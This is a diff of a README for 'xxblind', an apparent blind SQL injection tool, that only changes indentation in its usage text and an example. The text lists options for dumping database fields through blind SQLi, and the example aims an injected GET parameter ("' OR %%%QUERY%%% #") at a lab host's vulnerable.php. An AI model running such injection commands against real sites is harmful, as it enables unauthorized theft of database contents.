@@ -17,65 +17,65 @@ efficiency.
 ### Usage
 
 	usage: xxblind [-h] [-U] [-i] [-c COOKIE] [-y SUCCESS] [-s SAMPLE]
-		       [-d DICTIONARY] [-O {0,1,2,3,4}] [-q QUERY] [-Q QROWLEN]
-		       [-R QROWNUM] [-S QSEPS] [-W QWORDS] [-F FILTER] [-e SEPARATORS]
-		       -t TABLE -f FIELDS [-T THREADS] [-v] [-u URL]
-		       [-g [GET [GET ...]]] [-p [POST [POST ...]]] [-l LOCALDB]
-
+	               [-d DICTIONARY] [-O {0,1,2,3,4}] [-q QUERY] [-Q QROWLEN]
+	               [-R QROWNUM] [-S QSEPS] [-W QWORDS] [-F FILTER] [-e SEPARATORS]
+	               -t TABLE -f FIELDS [-T THREADS] [-v] [-u URL]
+	               [-g [GET [GET ...]]] [-p [POST [POST ...]]] [-l LOCALDB]
+	
 	Optimizated data retrieval via blind SQLi
-
+	
 	optional arguments:
 	  -h, --help            show this help message and exit
 	  -U, --upper           if specified, parse the uppercase version of sample
-				file
+	                        file
 	  -i, --quiet           turn off output
 	  -c COOKIE, --cookie COOKIE
-				pass the data as a cookie
+	                        pass the data as a cookie
 	  -y SUCCESS, --success SUCCESS
-				look for this string in the HTML page in case of SQLi
-				success
+	                        look for this string in the HTML page in case of SQLi
+	                        success
 	  -s SAMPLE, --sample SAMPLE
-				specify a sample text to parse for collecting
-				statistical informations
+	                        specify a sample text to parse for collecting
+	                        statistical informations
 	  -d DICTIONARY, --dictionary DICTIONARY
-				specify a dictionary file to fill missing words in the
-				sample file
+	                        specify a dictionary file to fill missing words in the
+	                        sample file
 	  -O {0,1,2,3,4}, --optimize {0,1,2,3,4}
-				perform an optimized binary search. Use 0 for no
-				optimization (linear search), 1 for binary search, 2
-				for binary search using letters frequency, 3 for
-				binary search using digrams frequency and 4 for
-				dictionary search
+	                        perform an optimized binary search. Use 0 for no
+	                        optimization (linear search), 1 for binary search, 2
+	                        for binary search using letters frequency, 3 for
+	                        binary search using digrams frequency and 4 for
+	                        dictionary search
 	  -q QUERY, --query QUERY
-				specify a query for character extraction
+	                        specify a query for character extraction
 	  -Q QROWLEN, --qrowlen QROWLEN
-				specify a query for extracting row length
+	                        specify a query for extracting row length
 	  -R QROWNUM, --qrownum QROWNUM
-				specify a query for extracting the number of rows
+	                        specify a query for extracting the number of rows
 	  -S QSEPS, --qseps QSEPS
-				specify a query for extracting the position of
-				separators in each row
+	                        specify a query for extracting the position of
+	                        separators in each row
 	  -W QWORDS, --qwords QWORDS
-				specify a query for words extraction
+	                        specify a query for words extraction
 	  -F FILTER, --filter FILTER
-				specify one or more conditions in every query
+	                        specify one or more conditions in every query
 	  -e SEPARATORS, --separators SEPARATORS
-				specify the separators
+	                        specify the separators
 	  -t TABLE, --table TABLE
-				specify a table
+	                        specify a table
 	  -f FIELDS, --fields FIELDS
-				specify one or more fields to dump
+	                        specify one or more fields to dump
 	  -T THREADS, --threads THREADS
-				specify the maximum number of concurrent threads
+	                        specify the maximum number of concurrent threads
 	  -v, --version         show program's version number and exit
 	  -u URL, --url URL     target url
 	  -g [GET [GET ...]], --get [GET [GET ...]]
-				define a list of GET variables
+	                        define a list of GET variables
 	  -p [POST [POST ...]], --post [POST [POST ...]]
-				define a list of POST variables
+	                        define a list of POST variables
 	  -l LOCALDB, --localdb LOCALDB
-				target db for simulation purposes. Pass parameters for
-				connecting in the form of host:user:pwd:dbname
+	                        target db for simulation purposes. Pass parameters for
+	                        connecting in the form of host:user:pwd:dbname
 
 ### Examples
 
@@ -89,9 +89,9 @@ The following command dumps the name field of the table person by performing a
 dictionary based search using 3 parallel threads:
 
 	xxblind -u "http://192.168.56.101/vulnerable.php" \
-		-g "name=’ OR %%%QUERY%%% #" -y "found" \
-		-f name -t person -O4 \
-		-s samples/names_it.txt -T3
+	        -g "name=’ OR %%%QUERY%%% #" -y "found" \
+	        -f name -t person -O4 \
+	        -s samples/names_it.txt -T3
 	[*] Performing dictionary search
 	[*] Getting separator positions
 	[*] Extracted data
